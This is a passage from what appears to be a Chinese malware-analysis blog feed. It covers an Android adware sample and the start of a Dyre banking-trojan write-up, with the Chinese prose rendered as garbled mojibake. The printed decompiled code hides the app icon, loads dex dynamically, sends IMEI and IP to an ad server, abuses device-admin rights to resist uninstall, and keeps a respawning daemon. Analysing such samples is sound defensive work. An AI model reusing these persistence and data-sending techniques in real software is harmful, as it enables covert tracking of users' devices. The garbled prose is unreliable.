class="hljs-number">1</span>) &#123;<br>            os.write(bytes, <span class="hljs-number">0</span>, numBytes);<br>        &#125;<br>        os.flush();<br>        os.close();<br>        is.close();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>MainActivityæ˜¯ com.dz.browser.WelActivity</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/icon1&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/main_name&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.dz.browser.WelActivity&quot;</span> <span class="hljs-attr">android:screenOrientation</span>=<span class="hljs-string">&quot;portrait&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br></code></pre></td></tr></table></figure><p>WelActivity é‡Œå¹²å‡ ä»¶äº‹ï¼š</p><ol><li>éšè—å›¾æ ‡</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setComponentEnabled</span><span class="hljs-params">(Context context, Class arg6, <span class="hljs-type">boolean</span> enabled)</span> &#123;<br>    <span class="hljs-type">ComponentName</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentName</span>(context, arg6.getName());<br>    <span class="hljs-type">PackageManager</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> context.getPackageManager();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> enabled ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>;<br>    v3.setComponentEnabledSetting(v0, v1, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>åŠ¨æ€åŠ è½½dex</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">GoMain</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>().postDelayed(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>            WelActivity.<span class="hljs-built_in">this</span>.setComponentEnabled(WelActivity.<span class="hljs-built_in">this</span>, WelActivity.class, <span class="hljs-literal">false</span>);<br>        &#125;<br>    &#125;, <span class="hljs-number">5000</span>);<br>    <span class="hljs-type">Intent</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>    v0.setClass(((Context)<span class="hljs-built_in">this</span>), GuideActivity.class);<br>    <span class="hljs-built_in">this</span>.startActivity(v0);<br>&#125;<br></code></pre></td></tr></table></figure><p>GuideActivity çš„ onCreate è°ƒç”¨ DZM.getInstance(((Context)this)).init(); åŠ è½½ dexã€‚ GuideActivity åŒæ—¶å‘å¹¿å‘ŠæœåŠ¡å™¨å‘é€æœ¬æœºä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Log.i(<span class="hljs-string">&quot;ads&quot;</span>, <span class="hljs-string">&quot;==&quot;</span> + HttpUtils.post(String.valueOf(Constant.reportUrl) + Utils.getQID(<br>                    GuideActivity.<span class="hljs-built_in">this</span>), GuideActivity.<span class="hljs-built_in">this</span>.Params.reqparams()));<br>        &#125;<br>        <span class="hljs-keyword">catch</span>(PackageManager$NameNotFoundException v1) &#123;<br>            v1.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;).start();<br></code></pre></td></tr></table></figure><p><a href="http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1">http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api-mobvista/sdkback?appkey=SexTubeMobvista1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>59<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>mob.s2s.nooobi.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Keep-Alive<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Apache-HttpClient/UNAVAILABLE (java 1.4)<br><br><span class="language-dts"><span class="hljs-attr">country</span><span class="hljs-operator">=</span>CN<span class="hljs-variable">&amp;ip</span>=<span class="hljs-number">220.231</span><span class="hljs-number">.27</span><span class="hljs-number">.156</span><span class="hljs-variable">&amp;model</span>=sdk<span class="hljs-variable">&amp;imei</span>=<span class="hljs-number">000000000000000</span></span><br></code></pre></td></tr></table></figure><p>åŒæ—¶åŠ è½½dexè¿˜æœ‰å¦å¤–ä¸€ä¸ªå…¥å£ï¼Œé€šè¿‡ Receiver</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;net.tend.dot.DZR&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.USER_PRESENT&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.dz.downloadmanager&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;action.dz.start&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PACKAGE_ADDED&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PACKAGE_REMOVED&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">android:scheme</span>=<span class="hljs-string">&quot;package&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å½“ç½‘ç»œå˜åŒ–ï¼Œç”¨æˆ·é”å±ç­‰æ“ä½œæ—¶å°†è‡ªåŠ¨åŠ è½½dex</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DZR</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DZR</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            a.a(context, i.class).onReceive(context, intent);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>(Exception v0) &#123;<br>            Log.e(<span class="hljs-string">&quot;ads&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, ((Throwable)v0));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> context.getApplicationContext();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> intent.getAction();<br>        System.out.println(<span class="hljs-string">&quot;SV=&quot;</span> + dzm_version.DZM_1_2_5);<br>        <span class="hljs-keyword">if</span>(action.equals(<span class="hljs-string">&quot;android.intent.action.USER_PRESENT&quot;</span>)) &#123;<br>            DZM.getInstance(context);<br>        &#125;<br><br>        l.start_thread(context);<br>        <span class="hljs-keyword">if</span>(l.str_dzmb_kiup_act().equals(action)) &#123;<br>            l.loadDex(context, intent);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.a(context, intent);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.dz.browser.MyReceiver&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.app.device_admin&quot;</span> <span class="hljs-attr">android:resource</span>=<span class="hljs-string">&quot;@xml/lockourscreen&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.app.action.DEVICE_ADMIN_ENABLED&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>lockourscreen.xml é‡Œç”³è¯·äº†é”å±æƒé™</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">device-admin</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">uses-policies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">force-lock</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">uses-policies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">device-admin</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯Receiveré‡Œä»€ä¹ˆä¹Ÿæ²¡æœ‰å¹²ï¼Œè¿™åªæ˜¯ä¸ºäº†é˜»æ­¢æ™®é€šç”¨æˆ·å¸è½½appã€‚</p><p><img src="http://1.bp.blogspot.com/-53HqGYuFduk/Vihzxsi5X-I/AAAAAAAABag/6RFUpBw0cgc/s1600/2015-10-22_09-27-10.png" alt="lock screen"></p><p>æ ·æœ¬ä¼šè®¿é—®ä¸‹é¢URL è·å¾—ipåœ°å€ä¿¡æ¯ <a href="http://ip.taobao.com/service/getIpInfo2.php?ip=myip">http://ip.taobao.com/service/getIpInfo2.php?ip=myip</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">&#123;<br><span class="hljs-symbol">code:</span> <span class="hljs-number">0</span>,<br><span class="hljs-symbol">data:</span> &#123;<br><span class="hljs-symbol">country:</span> <span class="hljs-string">&quot;ä¸­å›½&quot;</span>,<br><span class="hljs-symbol">country_id:</span> <span class="hljs-string">&quot;CN&quot;</span>,<br><span class="hljs-symbol">area:</span> <span class="hljs-string">&quot;ååŒ—&quot;</span>,<br><span class="hljs-symbol">area_id:</span> <span class="hljs-string">&quot;100000&quot;</span>,<br><span class="hljs-symbol">region:</span> <span class="hljs-string">&quot;åŒ—äº¬å¸‚&quot;</span>,<br><span class="hljs-symbol">region_id:</span> <span class="hljs-string">&quot;110000&quot;</span>,<br><span class="hljs-symbol">city:</span> <span class="hljs-string">&quot;åŒ—äº¬å¸‚&quot;</span>,<br><span class="hljs-symbol">city_id:</span> <span class="hljs-string">&quot;110100&quot;</span>,<br><span class="hljs-symbol">county:</span> <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-symbol">county_id:</span> <span class="hljs-string">&quot;-1&quot;</span>,<br><span class="hljs-symbol">isp:</span> <span class="hljs-string">&quot;åç‘ä¿¡é€š&quot;</span>,<br><span class="hljs-symbol">isp_id:</span> <span class="hljs-string">&quot;1000146&quot;</span>,<br><span class="hljs-symbol">ip:</span> <span class="hljs-string">&quot;220.231.27.156&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»åˆ†æçœ‹æ ·æœ¬ä¸»è¦æ˜¯è·å–å¹¿å‘Šï¼Œä¸‹è½½apkï¼Œå®‰è£…apk è¿™å‡ ä¸ªåŠŸèƒ½ï¼Œè¿˜å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€æŒ‡å®šURL</p><h2 id="daemon-åˆ†æ"><a href="#daemon-åˆ†æ" class="headerlink" title="daemon åˆ†æ"></a>daemon åˆ†æ</h2><p>ä¸¤ä¸ªæœåŠ¡ä¸­ï¼Œdaemon æ˜¯ arm elf å¯æ‰§è¡Œæ–‡ä»¶ï¼Œappå®‰è£…åè‡ªåŠ¨æ‰§è¡Œã€‚daemonç¨‹åºç”± dz.jar çš„ assets&#x2F;oilive é‡Šæ”¾å‡ºæ¥ã€‚ åœ¨æ‰‹æœºä¸Šå¾—åˆ°ä¸‹é¢çš„å‘½ä»¤è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">/data/data/org.dz.passion.browser/app_bin/daemon -p org.dz.passion.browser -s net.tend.dot.DZK -t 120<br></code></pre></td></tr></table></figure><p>daemon ä½¿ç”¨è¯´æ˜</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usage: %s -p package-name -s daemon-service-name -t interval-time<br></code></pre></td></tr></table></figure><p>daemon è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æ˜¯initï¼Œç»“æŸåº”ç”¨è¿›ç¨‹ä¸ä¼šç»“æŸdaemonè¿›ç¨‹ï¼Œå°†åº”ç”¨è¿›ç¨‹ç»“æŸåè¿‡120ç§’ï¼Œdaemonå°†ä¼šé‡æ–°è‡ªåŠ¨å¯åŠ¨ æœåŠ¡ç¨‹åºã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">u0_a45</span>    <span class="hljs-number">999</span>   <span class="hljs-number">36</span>    <span class="hljs-number">193564</span> <span class="hljs-number">32452</span> ffffffff <span class="hljs-number">40033</span>a40 S org.dz.passion.browser:daemon<br><span class="hljs-attribute">u0_a45</span>    <span class="hljs-number">1016</span>  <span class="hljs-number">36</span>    <span class="hljs-number">192640</span> <span class="hljs-number">35772</span> ffffffff <span class="hljs-number">40033</span>a40 S org.dz.passion.browser<br><span class="hljs-attribute">u0_a45</span>    <span class="hljs-number">1028</span>  <span class="hljs-number">1</span>     <span class="hljs-number">728</span>    <span class="hljs-number">296</span>   c0099f1c <span class="hljs-number">40032</span>c88 S /data/data/org.dz.passion.browser/app_bin/daemon<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªææ³•ä¼¼ç±»ä»¥å‰çš„åŒè¿›ç¨‹ç›‘æ§ï¼Œä¸å®¹æ˜“å¹²æ‰ï¼Œä¸Šé¢è¯´è¿‡å¯åŠ¨Appå°±å¯åŠ¨ä¸¤ä¸ªæœåŠ¡ DZS å’Œ DZKï¼Œè€ŒDZKçš„ä»£ç å…¶å®åœ¨MFKSä¸­ï¼Œ ä»ä¸‹é¢çš„ä»£ç å¯ä»¥çœ‹åˆ°ï¼ŒMFKSåœ¨Service çš„ OnCreate æ˜¯å°±æŠŠdaemon è¿è¡Œèµ·æ¥äº†ï¼Œdaemon åˆä¼šæ£€æŸ¥appçš„æœåŠ¡çš„çŠ¶æ€ï¼Œæœ‰ä¼šè‡ªåŠ¨ å¯åŠ¨æœåŠ¡ï¼Œæ¯”è¾ƒæµæ°“å•Šï¼è¿™ä¹ˆåšç›®çš„è¿˜æ˜¯ä¸ºäº†å¸¸é©»æ‰‹æœºï¼Œé•¿æœŸè¿è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MFKS</span> &#123;<br>    <span class="hljs-keyword">private</span> Service service;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MFKS</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> IBinder <span class="hljs-title function_">onBind</span><span class="hljs-params">(Intent arg2)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> &#123;<br>        run_daemon.install(<span class="hljs-built_in">this</span>.service.getApplicationContext(), config.get_kvp_classObject(<span class="hljs-built_in">this</span>.service  <span class="hljs-comment">// net.tend.dot.DZK</span><br>                .getApplicationContext()), <span class="hljs-number">120</span>);<br>        <span class="hljs-built_in">this</span>.service.startService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>.service.getApplicationContext(), config.get_svp_classObject(  <span class="hljs-comment">// net.tend.dot.DZS</span><br>                <span class="hljs-built_in">this</span>.service.getApplicationContext())));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onStart</span><span class="hljs-params">(Intent arg1, <span class="hljs-type">int</span> arg2)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setService</span><span class="hljs-params">(Service arg1)</span> &#123;<br>        <span class="hljs-built_in">this</span>.service = arg1;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h2><h3 id="è®¿é—®çš„URL"><a href="#è®¿é—®çš„URL" class="headerlink" title="è®¿é—®çš„URL"></a>è®¿é—®çš„URL</h3><p><a href="http://ip.taobao.com/service/getIpInfo2.php%3Fip%3Dmyip">http://ip.taobao.com/service/getIpInfo2.php%3Fip%3Dmyip</a><br><a href="http://api.nooobi.com/api-unlock/getlockappconfig">http://api.nooobi.com/api-unlock/getlockappconfig</a><br><a href="http://api.nooobi.com/api-unlock/insertimei">http://api.nooobi.com/api-unlock/insertimei</a><br><a href="http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1">http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1</a><br><a href="http://api.nooobi.com/api-unlock/getapptype">http://api.nooobi.com/api-unlock/getapptype</a><br><a href="http://api.nooobi.com/api-unlock/kitup">http://api.nooobi.com/api-unlock/kitup</a><br><a href="http://alog.umeng.com/app_logs">http://alog.umeng.com/app_logs</a><br><a href="http://api.nooobi.com/api-unlock/getadlist">http://api.nooobi.com/api-unlock/getadlist</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.png">http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpg">http://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpg</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.png">http://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpg">http://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpg</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.png">http://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg">http://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg</a><br><a href="http://api.nooobi.com/api-unlock/unlockaction">http://api.nooobi.com/api-unlock/unlockaction</a></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>DZSM è¿™ä¸ªæ ·æœ¬ä½¿ç”¨äº†åŠ¨æ€åŠ è½½dexçš„æŠ€æœ¯ï¼Œä½¿å¾—å…¶æ£€æµ‹æ›´åŠ å›°éš¾ã€‚ä»£ç ç»“æ„è‰¯å¥½ï¼Œå¼‚å¸¸å¤„ç†å……åˆ†ï¼Œ æ˜¯ä¸€ä¸ªä¸“ä¸šç¨‹åºå‘˜çš„ä½œå“ã€‚ä½¿ç”¨äº†ç®€å•çš„åŠ å¯†æŠ€æœ¯ï¼Œä¹Ÿæ˜¯ä¸ºäº†é€ƒé¿æ£€æŸ¥ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dyre ç®€å•åˆ†æ</title>
    <link href="/cn/malware_Dyre/"/>
    <url>/cn/malware_Dyre/</url>
    
    <content type="html"><![CDATA[<h2 id="0-æ¦‚è¿°"><a href="#0-æ¦‚è¿°" class="headerlink" title="0. æ¦‚è¿°"></a>0. æ¦‚è¿°</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">sha256   : 523<span class="hljs-type">b9e8057ef0905e2c7d51b742d4be9374cf2eee5a810f05d987604847c549d</span><br>md5      : <span class="hljs-type">c2d73485095efdbd7ab625e469affb11</span><br>filename : <span class="hljs-type">Invoice_00739287.scr</span><br></code></pre></td></tr></table></figure><p>è„±å£³åçš„ç¨‹åºä¸­å¯ä»¥çœ‹åˆ° C:\CPP_PROJECTS_GIT\DYRE\x64\Release\dyrecontroller.pdb å› æ­¤å¤§å¤šæ•°æ€è½¯å°†æ ·æœ¬å‘½åä¸ºdyreã€‚Dyreçš„ä¸»è¦ç›®æ ‡ä¸ºåœ¨çº¿é“¶è¡Œã€‚æ ·æœ¬çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶å®åˆ™æ˜¯ä½¿ç”¨scråç¼€çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¼•è¯±å—å®³è€…ç‚¹å‡»æ–‡ä»¶ã€‚</p><p>Dyreçš„ä¸€äº›å…¶ä»–æ ·æœ¬ MD5ï¼š</p><ul><li>999bc5e16312db6abff5f6c9e54c546f</li><li>b44634d90a9ff2ed8a9d0304c11bf612</li><li>dd207384b31d118745ebc83203a4b04a</li></ul><h2 id="1-æ„ŸæŸ“ä¸ä¼ æ’­"><a href="#1-æ„ŸæŸ“ä¸ä¼ æ’­" class="headerlink" title="1. æ„ŸæŸ“ä¸ä¼ æ’­"></a>1. æ„ŸæŸ“ä¸ä¼ æ’­</h2><p>ä»ç½‘ä¸Šçš„å…¬å¼€èµ„æ–™æ¥çœ‹ï¼Œæ ·æœ¬ä¸»è¦ä¼ æ’­é€”å¾„ä¸ºé’“é±¼é‚®ä»¶ã€‚</p><p><img src="http://2.bp.blogspot.com/-AyJ8UbhJvUM/VfrX9MpDSPI/AAAAAAAABQg/22nJydJKjOs/s400/Figure-21.png" alt="fishing"></p><h2 id="2-å·¥ä½œæµç¨‹"><a href="#2-å·¥ä½œæµç¨‹" class="headerlink" title="2. å·¥ä½œæµç¨‹"></a>2. å·¥ä½œæµç¨‹</h2><ul><li>å¤åˆ¶è‡ªèº« (C:\Documents and Settings\user\Application Data\googleupdaterr.exe)</li><li>æ‰§è¡Œå¤æœ¬æ–‡ä»¶</li><li>åˆ 